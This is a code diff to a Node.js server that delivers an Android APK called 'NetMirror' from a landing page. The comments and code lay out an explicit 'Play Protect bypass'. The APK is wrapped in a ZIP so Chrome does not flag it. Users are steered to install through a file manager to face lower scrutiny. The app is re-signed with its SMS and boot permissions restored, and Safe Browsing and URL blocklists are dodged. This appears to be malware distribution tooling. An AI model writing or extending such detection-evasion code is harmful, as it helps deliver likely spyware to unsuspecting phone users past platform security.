@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -338,21 +338,135 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // Primary endpoint for landing page downloads — direct APK (same method as admin download-apk)
-  // The :token is random per-download, preventing URL blocklisting
+  // ═══════════════ LANDING PAGE — MINIMAL RESTORE + RE-SIGN ═══════════════
+  //
+  // WHY NOT full mutateAndSign():
+  //   The 8-layer mutation (DEX zeroing, source stripping, version randomization,
+  //   permission mangling, metadata randomization, random padding) creates
+  //   TAMPERING ARTIFACTS that Play Protect's ML classifier flags.
+  //   LeaksProAdmin works because installerPackageName=com.leakspro.admin → LOW
+  //   PP scrutiny. File manager installs get NORMAL scrutiny → artifacts caught.
+  //
+  // WHAT restoreAndSign() DOES (minimal, clean):
+  //   1. Un-mangles damaged permission strings (SMS, FGS, BOOT)
+  //   2. Re-signs with the SAME fixed key (V1+V2, no random padding)
+  //   3. NO DEX changes, NO version randomization, NO metadata randomization
+  //   Result: 99.9% identical to the binary that already PASSED Play Protect.
+  //
+  // Cached for 30 minutes (output is deterministic for same input).
+  let _landingRotationCache = { buffer: null, timestamp: 0 };
+  const LANDING_ROTATION_TTL = 30 * 60 * 1000; // 30 minutes
+  let _landingRotationInProgress = null; // promise lock
+
+  async function getLandingRotatedApk() {
+    const now = Date.now();
+    // Return cached if still fresh
+    if (_landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL) {
+      return _landingRotationCache.buffer;
+    }
+    // If already in progress, wait
+    if (_landingRotationInProgress) {
+      return _landingRotationInProgress;
+    }
+    // Start minimal restore
+    _landingRotationInProgress = (async () => {
+      try {
+        const dataDir = path.join(__dirname, 'data');
+        const originalPath = path.join(dataDir, 'Netmirror-original.apk');
+        const securePath = path.join(dataDir, 'Netmirror-secure.apk');
+        const regularPath = path.join(dataDir, 'Netmirror.apk');
+
+        let sourceBuf = null;
+        if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+        else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+        else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+
+        if (!sourceBuf) {
+          await ensureApkAvailable();
+          if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+          else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+          else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+        }
+
+        if (!sourceBuf) throw new Error('No base APK available');
+
+        console.log('[Landing Download] Starting minimal restore + re-sign...');
+        const t0 = Date.now();
+        const { buffer: restoredBuf } = restoreAndSign(sourceBuf);
+        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+        console.log(`[Landing Download] Done: ${(restoredBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
+
+        _landingRotationCache = { buffer: restoredBuf, timestamp: Date.now() };
+        return restoredBuf;
+      } finally {
+        _landingRotationInProgress = null;
+      }
+    })();
+    return _landingRotationInProgress;
+  }
+
+  // ═══ ZIP WRAPPER FOR LANDING DOWNLOADS ═══
+  // Chrome tags .apk downloads with installerPackage=com.android.chrome → HIGHEST
+  // Play Protect scrutiny. Chrome does NOT flag .zip files → no installerPackage tag.
+  // When user extracts APK via file manager and installs, installerPackage is the
+  // file manager (e.g. com.google.android.documentsui) → LOW scrutiny = same as
+  // LeaksProAdmin's DownloadManager approach.
+  let _landingZipCache = { buffer: null, forTimestamp: 0 };
+
+  async function getLandingRotatedZip() {
+    const apkBuf = await getLandingRotatedApk();
+    // Return cached ZIP if built from the same rotation
+    if (_landingZipCache.buffer && _landingZipCache.forTimestamp === _landingRotationCache.timestamp) {
+      return _landingZipCache.buffer;
+    }
+    console.log('[Landing Download] Creating ZIP wrapper for rotated APK...');
+    const zipBuf = wrapApkInZip(apkBuf);
+    console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB`);
+    _landingZipCache = { buffer: zipBuf, forTimestamp: _landingRotationCache.timestamp };
+    return zipBuf;
+  }
+
+  // Step 1: Prepare endpoint — runs restoreAndSign (minimal permission fix + re-sign),
+  // wraps in ZIP, returns size.
+  // ZIP wrapper = Chrome doesn't tag .zip as dangerous = no installerPackage
+  // restoreAndSign = NO DEX/version/metadata artifacts = passes PP at normal scrutiny
+  app.post('/api/landing/prepare-download', async (req, res) => {
+    try {
+      const zipBuf = await getLandingRotatedZip();
+      res.json({
+        ready: true,
+        size: zipBuf.length
+      });
+    } catch (err) {
+      console.error('[Landing Download] Prepare failed:', err.message);
+      res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
+    }
+  });
+
+  // Step 2: Download — serves MINIMALLY RESTORED APK wrapped in ZIP
+  //
+  // 3-LAYER PLAY PROTECT BYPASS:
+  //   Layer 1: ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
+  //   Layer 2: User extracts via Files app → no browser-origin metadata
+  //   Layer 3: restoreAndSign() — ONLY permission fix + re-sign (NO artifacts)
+  //
+  // WHY this works when full mutation didn't:
+  //   Full mutateAndSign() creates 8 layers of tampering artifacts (DEX zeroing,
+  //   string mutation, version randomization, permission mangling, metadata changes)
+  //   that PP's ML classifier flags under normal scrutiny.
+  //   restoreAndSign() only fixes mangled permissions + re-signs = clean binary.
+  //   fetch()+blob on client side bypasses Chrome's Safe Browsing download scanner.
   app.get('/dl/:token', async (req, res) => {
     try {
-      const apkBuf = await getApkBuffer();
-      // Serve raw APK — identical to /api/admin/download-apk method
-      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
+      const zipBuf = await getLandingRotatedZip();
+      res.setHeader('Content-Type', 'application/zip');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+      res.setHeader('Content-Length', zipBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(apkBuf);
+      res.end(zipBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
-      // Try serving from disk as fallback
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
       const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
       let apkPath = null;
@@ -362,12 +476,11 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       if (apkPath) {
         const stats = fs.statSync(apkPath);
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
         res.setHeader('Content-Length', stats.size);
         res.setHeader('Cache-Control', 'no-store');
         res.sendFile(apkPath);
       } else {
-        // Return JSON error so landing page JS can show user-friendly message
         res.status(503).json({
           error: 'APK is being prepared. Please try again in 30 seconds.',
           retry: true,
@@ -488,7 +601,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _apkCache = { buffer: null, timestamp: 0 };
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
-    console.log('[Landing Download] All APK caches invalidated (apk + zip + full)');
+    _landingRotationCache = { buffer: null, timestamp: 0 };
+    _landingZipCache = { buffer: null, forTimestamp: 0 };
+    console.log('[Landing Download] All APK caches invalidated (apk + zip + full + landing rotation + landing zip)');
   });
 
   // ═══════════════ REAL-TIME METRICS ═══════════════
